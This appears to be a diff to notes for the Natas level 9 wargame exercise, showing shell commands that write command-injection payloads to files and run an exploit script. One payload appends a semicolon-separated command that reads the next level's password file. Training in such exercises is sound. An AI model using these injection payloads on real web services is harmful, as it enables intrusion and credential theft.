@@ -1,3 +1,8 @@
+# test.
+
+user@localhost:~$ echo "asdf; pwd" > natas9_test_payload
+user@localhost:~$ python3 exploit.py
+
 # work.
 
 user@localhost:~$ echo "asdf; cat ../../../../etc/natas_webpass/natas10" > natas9_payload
